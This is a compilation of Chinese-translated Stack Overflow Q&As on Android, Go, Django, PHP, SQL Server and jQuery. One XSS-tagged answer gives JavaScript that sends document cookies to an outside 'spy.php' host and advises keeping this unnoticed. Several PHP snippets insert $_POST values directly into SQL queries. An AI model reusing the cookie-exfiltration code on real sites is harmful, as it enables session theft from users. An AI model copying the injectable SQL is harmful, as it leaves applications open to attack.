<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent" 
   >

    <RelativeLayout
        android:id="@+id/popuplayout"
        android:layout_width="match_parent"
        android:layout_height="match_parent"
        android:orientation="vertical" 

        >

        <Button
            android:id="@+id/login_choose_language_txt"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:background="@drawable/popup_andr"
            android:text="@string/login_choose_language_txt" 
            />

        <LinearLayout
            android:layout_width="match_parent"
            android:layout_height="wrap_content"
            android:layout_below="@+id/login_choose_language_txt"
            android:layout_centerHorizontal="true"
            android:orientation="vertical" 
            android:background="@drawable/background_gray_9patch"
            android:layout_marginTop="-15dp"
            >

        <ImageView
            android:id="@+id/login_language_1"
            android:layout_width="50dp"
            android:layout_height="30dp"
            android:src="@drawable/pl" 
            android:layout_marginTop="10dp"
            android:layout_gravity="center_horizontal"/>
        <ImageView
            android:id="@+id/login_language_2"
            android:layout_width="50dp"
            android:layout_height="30dp"
            android:layout_marginTop="10dp"
            android:src="@drawable/pl"
            android:layout_gravity="center_horizontal" />
         <ImageView
            android:id="@+id/login_language_3"
            android:layout_width="50dp"
            android:layout_height="30dp"
            android:layout_marginTop="10dp"
            android:src="@drawable/pl"
            android:layout_gravity="center_horizontal" />
        <ImageView
            android:id="@+id/login_language_4"
            android:layout_width="50dp"
            android:layout_height="30dp"
            android:layout_marginTop="10dp"
            android:src="@drawable/pl"
            android:layout_gravity="center_horizontal" />
        </LinearLayout>

    </RelativeLayout>

</LinearLayout> 
```

问题是因为具有 imageViews 的布局覆盖了我的按钮的一部分。我知道我有 marginTop 因为我需要将此布局的顶部放在此按钮下，但我想将此部分从按钮下的顶部隐藏。我该怎么做才能使按钮位于布局之上？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T17:38:05.373

添加`android:layout_below="@+id/login_choose_language_txt"`到您的按钮标签。

# javascript - cookie 和 JavaScript

> ID：15159107
> 
> 赞同：0
> 
> 时间：2013-03-01T13:37:17.123
> 
> 标签：javascript, cookies, xss

我有这个脚本，它将搜索表单中输入的任何内容（即搜索表单的 id）发送到给定的 URL

```
 <script type="text/javascript">
document.getElementById("search-form").action="http://scitua.wlv.ac.uk/~in1345/spy.php";
</script > 
```

如何编辑脚本以便将文档 cookie intsead 发送到 URL？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T13:48:49.643

**原答案：**

```
".../spy.php?param=" + encodeURIComponent(document.cookies); 
```

* * *

好的，所以你有两个选择：

1.  将搜索完全重定向到间谍站点，并从间谍站点将用户重定向回第一页。`location.replace`如果您不想将间谍站点保留在历史记录中，您可以通过 javascript来完成。
2.  第二种方式更复杂。在搜索表单提交时，您设置一个像这样的 cookie，然后您让搜索表单提交。在搜索页面上，您将检查该 cookie，如果已设置，您将阅读并删除它。好的，您现在拥有需要发送的价值。简单的方法是：

    ```
    new Image().src="your_site?search="+search_val"+"&cookies="+document.cookies; 
    ```

    如果您无法访问搜索页面，您也可以在用户提交搜索表单时直接获取信息，但这可能非常可疑，因为用户会等到数据发送给您。

# android - 应用程序启动时堆大小增加到 35mb

> ID：15159108
> 
> 赞同：0
> 
> 时间：2013-03-01T13:37:26.107
> 
> 标签：android, out-of-memory, heap-memory, recycle, loading-image

我的应用程序包含多达 40 个带有 5 个选项卡的活动。每个活动都有一个背景图像。当我进入一项活动时，该活动的背景图像已被加载并显示。当我离开该活动时，我正在`onDestroy`方法中回收该图像。

上述过程运行良好，即*加载位图和回收位图*。

为了加载图像，我正在使用以下步骤。

我将缓存目录用于图像路径，将哈希图用于以图像路径为键的位图。

*   1）最初加载图像时，我正在使用该图像路径检查哈希图，如果它在那里，那么我只是将该位图设置为图像。

*   2）如果哈希图不包含位图或位图已经回收，那么我正在检查缓存的路径可用性。

*   3）如果缓存包含，那么我正在使用这些 url 哈希码创建位图。

对于回收：

*   1）我正在使用该图像路径检查哈希图并回收位图。

我的问题是

*   1）当我在几秒钟内启动应用程序时，堆大小会`OutOfMemeory`在几分钟内增加到 25 到 30 mb。

*   2）当我要进行活动时，堆大小会增加以加载图像，即使我正在维护缓存和哈希映射。

有没有办法最小化堆内存和存储位图的任何其他方法。

任何人都可以帮助我如何面对这种情况

我在下面发布了一些代码。

在此先感谢文卡特。

我的代码是：

```
public ConcurrentHashMap<String, WeakReference<Bitmap>> cache=new ConcurrentHashMap<String, WeakReference<Bitmap>>();

public void DisplayImage(String url,Activity activity, View imageView,int width,int height)
{
    this.REQUIRED_WIDTH = width;
    this.REQUIRED_HEIGHT = height;

    if(cache.containsKey(url) && cache.get(url).get() != null && !cache.get(url).get().isRecycled())
    {
        if(imageView instanceof ImageView)
        {
            ((ImageView)imageView).setImageBitmap(cache.get(url).get());
        }
        else
            imageView.setBackgroundDrawable(new BitmapDrawable(cache.get(url).get()));

    }
    else
    {
        if(cache.containsKey(url))
        {
            cache.remove(url);
        }
        queuePhoto(url, activity, imageView);
        if(imageView instanceof ImageView)
        {
            ((ImageView)imageView).setBackgroundResource(stub_id);
        }
        else
        {
                        imageView.setBackgroundColor(Color.parseColor(AppConstants.customCollection.HomeScreen));
        }
    }    
}

public void recycleBitmaps(final String backgroundImageUrl)
{
    new Handler().postDelayed(new Runnable() 
    {
        public void run()
        {
            stopThread();
            Vector<WeakReference<Bitmap>> vecBitmapRef = new Vector<WeakReference<Bitmap>>();
            if(!cache.isEmpty())
            {
                if(backgroundImageUrl!=null && !backgroundImageUrl.equalsIgnoreCase(""))
                {
                    WeakReference<Bitmap> bmpref = (WeakReference<Bitmap>)cache.get(backgroundImageUrl);
                    if(bmpref!=null && bmpref.get()!=null && !bmpref.get().isRecycled())
                    {
                        vecBitmapRef.add(cache.remove(backgroundImageUrl));
                    }
                }
                Set<String> keys = cache.keySet();
                for(String key: keys)
                {
                    vecBitmapRef.add(cache.remove(key));
                }
                    Log.e("Bitmap size", ""+vecBitmapRef.size());
                try
                {
                    for(WeakReference<Bitmap> bitmapRef : vecBitmapRef)
                    {
                        if(bitmapRef != null && bitmapRef.get() != null)
                        {
                            if(!bitmapRef.get().isRecycled())
                            {
                                bitmapRef.get().recycle();
                                bitmapRef.enqueue();
                                bitmapRef =null;
                            }
                        }
                        Runtime.getRuntime().gc();
                    }
                }
                catch (Exception e)
                {
                    // TODO: handle exception
                }
                vecBitmapRef.clear();
                cache.clear();
            }
        }
    },500);

} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T18:06:24.453

我假设每个活动都有一个 imageView。我认为某些活动及其附加视图不会被破坏，因此 ImageViews 维护对您的位图的引用，因此 bitmapRef.get() 不会返回 null，因为 imageViews 对其底层位图有很强的引用。

为了证实这个假设，您可以尝试堆转储来查看内存的积累。

[Android ==> 内存分析 ==> Eclipse 内存分析器？](https://stackoverflow.com/questions/3112671/android-memory-analysing-eclipse-memory-analyzer)

希望它会有所帮助！

# glassfish - Glassfish 服务器本地和远程命令之间的区别？

> ID：15159113
> 
> 赞同：2
> 
> 时间：2013-03-01T13:37:39.627
> 
> 标签：glassfish

我无法理解 Glassfish 服务器本地和远程命令之间的区别。在给出的链接

[1]：[http](http://weblogs.java.net/blog/kalali/archive/2010/04/25/learning-glassfish-v3-command-line-administration-interface-cli) ://weblogs.java.net/blog/kalali/archive/2010/04/25/learning-glassfish-v3-command-line-administration-interface-cli说：

> 本地命令是一组命令，它们要么影响应用程序服务器正在运行的环境，要么需要在本地访问应用程序服务器环境以执行一些脚本或批处理文件来执行作业。
> 
> 在本地命令的另一端，我们有远程命令，它们形成一组命令，这些命令会影响正在运行的应用程序服务器实例配置，并使用部署在应用程序服务器本身中的应用程序访问应用程序服务器环境和文件系统。因此，目标实例应该正在运行，并且在管理工作站和服务器机器上运行的 GlassFish 实例之间应该有一条网络路由。

我想我有两台机器，即机器 A 和机器 B。我在机器 B 上运行 Glassfish。我可以`asadmin`在机器 A 上使用机器 B 连接运行在机器 B 上的 Glassfish 并执行任何本地或远程命令吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-02T16:57:54.663

这很简单：

“远程”命令是提供给正在运行的 Glassfish 服务器的任何命令。
“本地”命令是不提供给正在运行的 GlassFish 服务器的命令。

一个简单而明显的例子是启动域的命令。*显然*，此时没有运行 GlassFish 服务器。它必须是本地命令。

要点

1.  所有远程命令都使用主机和端口进行通信。
2.  本地命令仅在当前机器上运行。不可能使用 asadmin 直接在另一台机器上运行本地命令（没有任何东西可以与之通信）。
3.  就 asadmin 而言，在当前机器或 10,000 英里外的机器上运行远程命令完全相同。它只是使用不同的主机地址。

要在不同的机器上运行远程命令，只需使用 --host 选项指定主机。

# android - 电量不足时强制关闭应用程序

> ID：15159115
> 
> 赞同：0
> 
> 时间：2013-03-01T13:37:42.440
> 
> 标签：android, power-management

我正在为应用程序编写代码，我只想在其中添加一个功能，即当电池电量变低时（例如低于 20%），应用程序将自动停止并且相应的服务也将关闭，这可能吗？如果可以，请给一些方法可以做到这一点..提前谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-01T13:39:48.633

`Intent` `"android.intent.action.ACTION_BATTERY_LOW"`你应该听`BroadcastReciever`

您可以通过以下方式停止您的组件：`BroadcastReceiver`在您的`Services`和`Activities`. 它将收到`Intent`您可以停止组件的位置：`Activity`has `finish()`，`Service`has `stopSelf()`。这只会停止之前运行的组件！（一件好事）

或者您可以`BroadcastReceiver`通过以下方式完成`manifest`：当您收到它时，`BroadcastReceiver.onReceive`您可以致电`stopService`停止您的服务。要阻止它要`Activity`困难得多，请检查您`Activity`是否在前台，向其发送自定义 Intent。它会收到它并可以自行停止。前提是它是`singleInstance`.

# go - 从 Go 中的标准输入读取一个字符（不按 Enter）

> ID：15159118
> 
> 赞同：27
> 
> 时间：2013-03-01T13:37:46.537
> 
> 标签：go, stdin

我希望我的应用显示：

```
press any key to exit ... 
```

并在我按**任意**键时退出。

我怎样才能做到这一点？

注意：我已经用谷歌搜索了，但我发现的所有内容都需要`Enter`在最后按下。我想要类似`Console.ReadKey()`C# 的东西。

我正在运行 MS Windows。

* * *

## 回答 #1

> 赞同：31
> 
> 时间：2013-06-24T15:06:06.070

对于那些运行 UNIX 系统的人来说，这是一个最小的工作示例：

```
package main

import (
    "fmt"
    "os"
    "os/exec"
)

func main() {
    // disable input buffering
    exec.Command("stty", "-F", "/dev/tty", "cbreak", "min", "1").Run()
    // do not display entered characters on the screen
    exec.Command("stty", "-F", "/dev/tty", "-echo").Run()

    var b []byte = make([]byte, 1)
    for {
        os.Stdin.Read(b)
        fmt.Println("I got the byte", b, "("+string(b)+")")
    }
} 
```

* * *

## 回答 #2

> 赞同：15
> 
> 时间：2013-03-01T14:34:08.523

[termbox-go](https://github.com/nsf/termbox-go)是一个轻量级的 Go-native 包，它提供了一些基本的终端控制。包括以原始模式获取输入的能力（一次读取一个字符，没有默认的行缓冲行为）。

它在不同系统之间也具有相当好的兼容性。

[键盘](https://github.com/jteeuwen/keyboard)扩展了termbox -go 以提供一些额外的键盘功能，例如多键快捷键和序列。

* * *

## 回答 #3

> 赞同：11
> 
> 时间：2015-08-14T21:10:28.337

go-termbox 是非常重量级的。它想接管整个终端窗口。例如，它在启动时清除屏幕，这可能不是您想要的。

我把它放在OSX上。只是一个小小的 getchar()：

[https://github.com/paulrademacher/climenu/blob/master/getchar.go](https://github.com/paulrademacher/climenu/blob/master/getchar.go)

* * *

## 回答 #4

> 赞同：9
> 
> 时间：2016-05-05T13:39:36.223

你可以使用这个库（我的）：[https ://github.com/eiannone/keyboard](https://github.com/eiannone/keyboard)

这是获取单次击键的示例：

```
char, _, err := keyboard.GetSingleKey()
if (err != nil) {
    panic(err)
}
fmt.Printf("You pressed: %q\r\n", char) 
```

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2013-03-01T14:27:48.433

您可以在原始模式下从终端读取单个按键。[这](https://code.google.com/p/go/source/browse/ssh/terminal/util.go?repo=crypto)是一个应该为您的程序提供原始终端模式的包。抓住：它只是Linux。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2013-06-25T04:32:09.833

试试这个 - [http://play.golang.org/p/kg-QirlucY](http://play.golang.org/p/kg-QirlucY)。

只需阅读`os.Stdin`末尾的`func main`

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2022-01-07T21:52:56.280

包“golang.org/x/term”允许您将标准输入切换到原始模式以一次读取每个字节。

```
package main

import (
    "fmt"
    "os"

    "golang.org/x/term"
)

func main() {
    // switch stdin into 'raw' mode
    oldState, err := term.MakeRaw(int(os.Stdin.Fd()))
    if err != nil {
        fmt.Println(err)
        return
    }
    defer term.Restore(int(os.Stdin.Fd()), oldState)

    b := make([]byte, 1)
    _, err = os.Stdin.Read(b)
    if err != nil {
        fmt.Println(err)
        return
    }
    fmt.Printf("the char %q was hit", string(b[0]))
} 
```

# django - Django：空注释表单错误处理

> ID：15159119
> 
> 赞同：0
> 
> 时间：2013-03-01T13:37:52.700
> 
> 标签：django, forms, redirect, comments

我使用标准的 django 评论框架。

模板：

```
<h2>Add comment</h2> {%  get_comment_form for post as form %} 
<form  action="{% comment_form_target %}" method="post" > {% csrf_token %}   
{{form.content_type}}{{form.object_pk}}{{form.timestamp}}{{form.security_hash}}
Comment:<br />
{{form.comment}}

<input type="hidden" name="next" value="{{ request.get_full_path }}#comment" /> 

<button class="btn btn-large btn-primary" type="submit">Post</button>

</form> 
```

网址：

```
(r'^comments/', include('django.contrib.comments.urls')), 
```

然后我发送空表单，我重定向到 /comments/post/ 页面。我怎样才能重新加载当前页面并添加错误消息？谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T13:44:45.680

这是正确的行为。看到了`<form action="{% comment_form_target %}" method="post">`吗？您的表单提交到 url`/comments/post/`页面，因此即使它是空白的，您也会到达那里。您需要做的是向视图添加某种处理方式，以便`/comments/post/`将您重定向到原始页面，并显示一条消息，告诉用户在表单不完整或不正确时填写表单。Django 通常会这样做，所以我不知道这里有什么不同。

# php - 邮件 SMTP 错误 PHP

> ID：15159121
> 
> 赞同：0
> 
> 时间：2013-03-01T13:37:58.720
> 
> 标签：php, smtp, pear, wampserver, mail-server

```
require_once "Mail.php";
error_reporting(E_ALL ^ E_STRICT);
    $mail_To = $email;
            $mail_Subject = "Reservation notification From Tamera Plaza Inn";
            $mail_Body = "First Name: $name\n".
    "Last Name: $last\n".
    "Email: $email \n".
    "City: $city \n".
    "Zip Code: $zip \n".
    "Country: $country \n".
    "Contact Number: $cnumber \n".
    "Password: $password \n".
    "Check In: $arrival\n ".
    "Check Out: $departure\n ".
    "Number of Adults: $adults\n ".
    "Number of child: $child\n ".
    "Total nights of stay: $result\n ".
    "Room Type: $type\n ".
    "Number of rooms: $nroom\n ".
    "Payable amount: $payable\n ".
    "Confirmation Number: $confirmation\n ";

     $host = "localhost";
             $username = "";
             $password = "";

 $smtp = Mail::factory('smtp',
        array ('host' => $host,
               'auth' => true,
               'username' => $username,
               'password' => $password));

     $mail = $smtp->send($mail_To, $mail_Subject, $mail_Body);
       if (PEAR::isError($mail)) {
           echo("<p>" . $mail->getMessage() . "</p>");
       } else {
           echo("<p>Message successfully sent!</p>");
       } 
```

如您所见，上面的代码用于发送电子邮件。这就是我的网络正在尝试做的事情，但阻碍我成功的一件事是下面的错误。我似乎无法连接到我的 PEAR 邮件服务器。我在这里错过了什么吗？

```
ERROR:
  Failed to connect to localhost:25 [SMTP: Failed to connect socket: No connection could be made because the target machine actively refused it. (code: -1, response: )] 
```

顺便说一句，我正在使用 Wampserver

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T13:42:32.490

```
No connection could be made because the target machine actively refused it. 
```

This is your problem, as stated in your error message. Check the firewall settings of your mail server.

# sql-server - SQL Server Express 精度

> ID：15159122
> 
> 赞同：1
> 
> 时间：2013-03-01T13:37:59.393
> 
> 标签：sql-server

尝试从 TADOQuery 包装器对象执行以下 SQL 查询时遇到问题：

```
SELECT * 
FROM obj
WHERE ObjectType = 'user' 
  AND ( ((( valueOne > 6.13661152336E-318 ) and ( valueTwo < 1.68611310981 ) 
```

问题显然`ValueOne`是太小了，因此无法在正常的 64 位机器精度内表示。问题是我从文件中读取了这些值，但我无法控制我得到的输入数据。我会实施一个舍入过程来处理这个问题，但我不确定 SQL Server 2012 Express 中哪个是最小（绝对值）可表示数字。

谁能帮我解决这个问题

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-01T13:42:44.503

[`Decimal and numeric`](http://msdn.microsoft.com/en-us/library/ms187746.aspx)：

> 固定精度和比例数字。使用最大精度时，**有效值从 - 10^38 +1 到 10^38 - 1**

[`float and real`](http://msdn.microsoft.com/en-us/library/ms173773.aspx)：

> 浮动范围：**- 1.79E+308 至 -2.23E-308、0 和 2.23E-308 至 1.79E+308**
> 实际范围：**- 3.40E + 38 至 -1.18E - 38、0 和 1.18E - 38 至 3.40E + 38**

[`int, bigint, smallint, and tinyint`](http://msdn.microsoft.com/en-us/library/ms187745.aspx)：

> bigint 范围：**-2^63 (-9,223,372,036,854,775,808) 到 2^63-1 (9,223,372,036,854,775,807)**
> int 范围：**-2^31 (-2,147,483,648) 到 2^31-1 (2,147,483,647)**
> smallint 范围：**-2^5-32 ) 到 2^15-1 (32,767)**
> tinyint 范围：**0 到 255**

`6.13661152336E-318`在 SQL Server 中可表示为本机 SQL Server 支持的类型的范围之外。您可以尝试使用[CLR 用户定义类型](http://msdn.microsoft.com/en-us/library/ms131120.aspx)。您将需要一个自定义 CLR 库来操作这些极值。

# zend-framework2 - 超过使用 ZF2 形式定义的 ini 大小

> ID：15159125
> 
> 赞同：0
> 
> 时间：2013-03-01T13:38:10.560
> 
> 标签：zend-framework2

我在尝试实现文件上传时收到此错误。

```
if ($request->isPost()) {

        $form->setInputFilter($language->getInputFilter());
        $nonFile = $request->getPost()->toArray();
        $File = $this->params()->fromFiles('fileupload');
        $data = array_merge(
                $nonFile, array('fileupload' => $File['name'])
        );
        $form->setData($request->getPost());
        if ($form->isValid()) {
            $size = new Size(array('min' => 20));
            $adapter = new \Zend\File\Transfer\Adapter\Http();
            $adapter->setValidators(array($size), $File['name']);
            if (!$adapter->isValid()) {

                $dataError = $adapter->getMessages();
                $error = array();
                foreach ($dataError as $key => $row) {
                    $error[] = $row;
                } //set formElementErrors
                $form->setMessages(array('fileupload' => $error));
            } else {
                $adapter->setDestination(dirname(__DIR__) . '/module/Application/Lanuguage');
                if ($adapter->receive($File['name'])) {
                    $data = $form->getData();
                    $language->populate($data);
                    $this->getEntityManager()->persist($language);
                    $this->getEntityManager()->flush();
                    echo ' upload ' . $language->fileupload;
                }
            }

            return $this->redirect()->toRoute('admin_language');
        }
    } 
```

现在，当我为 $dataError 进行转储时。我收到这条消息

> 数组（[fileUploadErrorIniSize] => File '' 超出定义的 ini 大小）

我正在尝试上传一个 85 字节大小的文件。我的 php.ini 中的默认文件上传大小为 8M。

# jquery - jQuery过早淡入

> ID：15159130
> 
> 赞同：0
> 
> 时间：2013-03-01T13:38:25.823
> 
> 标签：jquery, jquery-animate, opacity, fade

我正在尝试使一组方形 div（“.block”）在单击一个时淡出，以替换为更大的 div（“#container”），一旦它们淡出就会淡入。这工作正常：

```
$('.block').animate({opacity:0},400,'swing',function(){ $('#container').fadeIn();}); 
```

我在这里使用“动画”，因为我不希望块所占据的空间在它们淡出时崩溃（如果我使用淡出会发生这种情况）。

'#container' div 有一个关闭按钮，单击该按钮应该会淡出容器并再次淡入块。问题来了：当点击关闭按钮时，容器淡出没问题，但是新块出现的非常突然，好像它们没有等待容器先关闭一样。代码：

```
$('#container').fadeOut(400,function(){ $('.block').animate({opacity:100},400,'swing');}); 
```

[这个问题](https://stackoverflow.com/questions/4981608/simple-jquery-fading-sequence-problem)建议增加延迟——对我来说，这一切都是淡出容器，然后等待一秒钟，然后很快（太快）把块带回来。

任何为什么这不起作用的想法都非常感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T13:55:47.250

CSS opacity 接受从 0 到 1 的值。

```
$('#container').click(function () {
    $(this).fadeOut(400, function () {
        $('.block').animate({
            opacity: 1 //was 100
        }, 400, 'swing');
    });
}); 
```

[http://jsfiddle.net/WEhCc/1/](http://jsfiddle.net/WEhCc/1/)

# django - 带/不带代理服务器的 Django URL

> ID：15159134
> 
> 赞同：1
> 
> 时间：2013-03-01T13:38:39.217
> 
> 标签：django, proxy-server, urlconf

我有两个使用 Apache mod_wsgi 托管在同一台机器上的Django 应用程序（比如`app1`和）。`app2`这两个应用程序托管在两个不同的环境中：

1.  在仅托管这两个应用程序的物理服务器上。它们以`http://www.example.com/app1/app1/`和访问`http://www.example.com/app2/app2/`。
2.  在第二个环境中有一个代理服务器。该服务器上的单独网页以`http://www.domain.com/`. 这链接到上述两个应用程序（现在托管在单个虚拟机上）作为`http://www.domain.com/id1/`和`http://www.domain.com/id2/`

URLconf 文件如下所示：

```
urlpatterns = patterns('',
    (r'^admin/', include(admin.site.urls)),
    (r'^app1/', include('project.app1.urls')),        
) 
```

问题是，此 URL 配置在环境中有效`1`，但在环境中无效`2`。现在，如果我在环境中做一些*疯狂*`2`的事情，比如

```
 urlpatterns = patterns('',
    (r'^admin/', include(admin.site.urls)),
    (r'^app1/app1/app1/', include('project.app1.urls')),        
    (r'^app1/app1/', include('project.app1.urls')),        
    (r'^app1/', include('project.app1.urls')),        
 ) 
```

然后应用程序工作。在环境中。`2`，应用程序被访问为`http://www.domain.com/id1/app1/app1/`。

我不明白为什么我们需要`app1`在 URL 中多次添加前缀。换句话说，为什么（如何）这样做。

有人可以澄清一下吗？另外请注意，所有配置都需要在虚拟机上完成。我无权访问代理服务器。

# html - 如何顺利展开一个Div？

> ID：15159140
> 
> 赞同：1
> 
> 时间：2013-03-01T13:39:06.220
> 
> 标签：html, expand, collapse

我有一个根据选择结果扩展的 div，它的高度设置为“自动”。我想让这个扩展变得柔软，非常难。

用于展开和折叠 div 的脚本::

```
<script type="text/javascript">
        function ShowHideDIV(NomeDIV, Valor) {
            Valor = document.getElementById("Lista").value;
            if (Valor == "Sim") {
                document.getElementById(NomeDIV).style.display = "block";
            } else {
                document.getElementById(NomeDIV).style.display = "none";
            }
        }
</script> 
```

父 div （我想把效果）：

```
<div class="bgCotar"></div> 
```

选择（负责Parent div的扩展）：

```
<div class="campo" id="campo4">
   <label>Incluir Dependentes?</label><br />
   <select name="Lista" size="1" id="Lista"
   onChange="ShowHideDIV('CampoOculto','Sim');">
      <option value="0">Selecione...</option>
      <option value="Sim">Sim</option>
      <option value="Nao">Não</option>
   </select>                                     
</div> 
```

我想知道的一个例子：http: [//www.maujor.com/blog/pg_apoio/jquery-toggle-texto-exemlo.html](http://www.maujor.com/blog/pg_apoio/jquery-toggle-texto-exemplo.html)

对不起我的英语不好，我的语言是葡萄牙语。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T13:42:40.907

您展示的网站使用 jQuery - slideToggle 功能 - [http://api.jquery.com/slideToggle/](http://api.jquery.com/slideToggle/)。使用它来为您的页面设置动画

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T13:42:40.250

You must take a look at jquery. It has some good effects to do what you want to. Also, again, you can use jquery's animate() function.

[http://www.w3schools.com/jquery/jquery_animate.asp](http://www.w3schools.com/jquery/jquery_animate.asp)

[http://www.w3schools.com/jquery/tryit.asp?filename=tryjquery_slide_toggle](http://www.w3schools.com/jquery/tryit.asp?filename=tryjquery_slide_toggle)

# php - 同时向数据库输入两个或多个值

> ID：15159143
> 
> 赞同：0
> 
> 时间：2013-03-01T13:39:13.757
> 
> 标签：php, mysql

我是 PHP 新手，我这样做对吗？下面代码的功能将同时将 2 个值放入数据库中。一旦我在 2 个文本框中输入值，只有第一个文本框中的值会存储到数据库中。如何使用一种形式将这两个值存储到数据库中？

**添加.php**

```
 <?php
    $con = mysql_connect("localhost","root","");
    if (!$con)
    {
    die('Could not connect: ' . mysql_error());
        }

    mysql_select_db("my_database", $con);

    mysql_close($con);
    ?> 

    <html>
    <body>

    <form action="insert.php" method="post" name="form1">
    Firstname: <input type="text" name="firstname" />
    Firstname1: <input type="text" name="firstname" />

    Age: <input type="text" name="age" />

    <input type="submit" name="form1" />
    </form>

    </body>
    </html> 
```

**插入.php**

```
 <html>
     <head>
      <title>Record Added</title>
      <meta http-equiv="refresh" content="0;url=select.php">
     </head>
     <body>
     <?php
    $con = mysql_connect("localhost","root","");
    if (!$con)
      {
      die('Could not connect: ' . mysql_error());
      }

    mysql_select_db("my_database", $con);

    $sql="INSERT INTO biodata (FirstName)
    VALUES
    ('$_POST[firstname]')";

    if (!mysql_query($sql,$con))
      {
      die('Error: ' . mysql_error());
      }
    echo "1 record added";

    mysql_close($con);
    ?> 

    <a href="select.php"> see</a>

     </body>
    </html> 
```

**选择.php**

```
 <?php
    $dbHost = 'localhost';
    $dbUser = 'root';
    $dbPass = '';
    $dbName = 'my_database';

    $dbConn = mysql_connect ($dbHost,$dbUser, $dbPass) or die ('MySQL connect failed. ' . mysql_error());
    mysql_select_db($dbName) or die('Cannot select database. ' . mysql_error());

    ?>

    <html>
    <head>
    <title>Display</title>
    </head>
    <table align="center" border=1>
    <tr>
    <th> First Name</th>
    <th>Last Name </th>
    <th> Age </th>
    </tr>

    <?php
    $query = "SELECT * FROM biodata";
    $result = mysql_query($query);
    while ($row = mysql_fetch_assoc($result)){
    ?>
    <tr><td><?php echo $row['FirstName'];?></td>

    </tr>
    <?php }?>
    </table>
    </body>
    </html> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T14:55:22.033

### [更新]试试这个：

将表单中的值作为数组发送，以访问第二个输入。否则，您的记录将被覆盖。除了它们形成一个数组之外，您实际上不能有两个具有相同名称的表单字段。这应该是您的最佳选择。在这里，我们将两个值存储在同一个表中的两列中。

### 你的表格

```
<form action="add.php" method="post" name="verify">
<font color="#FFFF00">Name:</font> <input type="text" name="FistName[0]" />
<font color="#FFFF00">Name:</font> <input type="text" name="FirstName[1]"/>

<input type="submit" value="add" name="verify"/> 
```

### 使用它将文本框 2 添加到数据库中

```
<?php
$names = $_POST["FirstName"];
$FirstName_1 = mysql_real_escape_string($names[0]);
$FirstName_2 = mysql_real_escape_string($names[1]);

$query = "INSERT INTO biodata (FirstName_1, FirstName_2)
VALUES ('" . $FirstName_1 . "', '" . $FirstName_2 . "') ";
$result = mysql_query($query);

?> 
```

### 使用它从数据库中显示

```
<?php
$query = "SELECT * FROM biodata";
$result = mysql_query($query);
while ($row = mysql_fetch_assoc($result)){
?>
<tr><td><?php echo $row["FirstName_1"];?></td>
</tr> 
```

### 要将两个或多个值添加到数据库，请按照 w3schools 中的此示例使用 mysqli（注意 mysql 已弃用）。

```
<?php
//Filename: insert.php
$con=mysqli_connect("example.com","peter","abc123","my_db");
// Check connection
if (mysqli_connect_errno())
  {
  echo "Failed to connect to MySQL: " . mysqli_connect_error();
  }

$sql="INSERT INTO Persons (FirstName, LastName, Age)
VALUES
('$_POST[firstname]','$_POST[lastname]','$_POST[age]')";

if (!mysqli_query($con,$sql))
  {
  die('Error: ' . mysqli_error());
  }
echo "1 record added";

mysqli_close($con);
?> 
```

你的表格：

```
<html>
<body>

<form action="insert.php" method="post">
Firstname: <input type="text" name="firstname">
Lastname: <input type="text" name="lastname">
Age: <input type="text" name="age">
<input type="submit">
</form>

</body>
</html> 
```

在这里运行一个简单的课程：

[http://www.w3schools.com/php/php_mysql_insert.asp](http://www.w3schools.com/php/php_mysql_insert.asp)

# javascript - 如何用jquery延迟函数的执行？

> ID：15159146
> 
> 赞同：0
> 
> 时间：2013-03-01T13:39:25.083
> 
> 标签：javascript, jquery, asynchronous

我有那种代码可以将`li`元素附加到具有奇特效果的给定元素上`ul`，然后我调用一个函数，其行为取决于 that 的子元素数`ul`：

```
$(li).hide().appendTo("#ul-authors").show("blind");
toggleIfNeeded();

...

function toggleIfNeeded() {
  if ($("#ul-authors > li").length === 1) {
     doSomething();
  } else {
     doSomethingElse();
  }
} 
```

问题是，当`toggleIfNeeded`被调用时，新的`li`似乎还不存在，因为效果并没有完全执行。如果我删除效果，它可以正常工作。

我怎样才能做到这一点 ？我想我需要某种计时器，但这将是异步的（我不想阻止应用程序以获得奇特的效果），或者更好的是告诉“在执行效果时调用该函数”的方式。

`1`由于可以在不涉及任何效果的其他上下文中调用代码，因此我无法更改`0`上述内容。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-01T13:41:40.673

您可以将回调传递给`.show()`. 如果你改变

```
$(li).hide().appendTo("#ul-authors").show("blind");
toggleIfNeeded(); 
```

到

```
$(li).hide().appendTo("#ul-authors").show("blind", toggleIfNeeded); 
```

那么你的函数将在动画完成时自动调用。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-01T13:42:31.063

show() 的第二个参数可以是一个函数，你可以在动画结束时做你想做的事情

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-01T13:45:43.787

试试这个

```
.show('<effect>', callbackFunction) 
```

# c# - 如何确定认证类型？

> ID：15159147
> 
> 赞同：3
> 
> 时间：2013-03-01T13:39:25.943
> 
> 标签：c#, dynamics-crm-2011, dynamics-crm-online, service-discovery, dynamics-crm-2013

我创建了单独的身份验证方法（一种用于在线，一种用于内部部署）。现在，我让用户选择使用哪种方法（然后提供组织服务的 URL 和凭据）。

我想使该过程自动化，我发现有关身份验证类型的信息应该在发现服务中。也是这样。我可以使用以下代码获取它。

```
DiscoveryServiceProxy discovery = new DiscoveryServiceProxy(
  logOnInformation.Organization,
  logOnInformation.HomeRealm,
  logOnInformation.ClientCredentials,
  logOnInformation.DeviceCredentials);

Console.Write(discovery.ServiceManagement.AuthenticationType`); 
```

